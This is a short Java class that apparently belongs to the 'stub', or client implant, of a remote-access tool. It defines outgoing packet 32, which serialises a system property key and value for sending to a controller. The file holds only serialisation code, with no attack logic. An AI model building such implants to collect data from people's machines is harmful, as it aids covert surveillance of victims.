package com.redpois0n.stub.packets.outgoing;

import java.io.DataOutputStream;

import com.redpois0n.common.io.StringWriter;

public class Packet32SystemProperties extends AbstractOutgoingPacket {
	
	private String key;
	private String property;

	public Packet32SystemProperties(String key, String property) {
		this.key = key;
		this.property = property;
	}

	@Override
	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
		sw.writeLine(key);
		sw.writeLine(property);
	}

	@Override
	public byte getPacketId() {
		return 32;
	}

}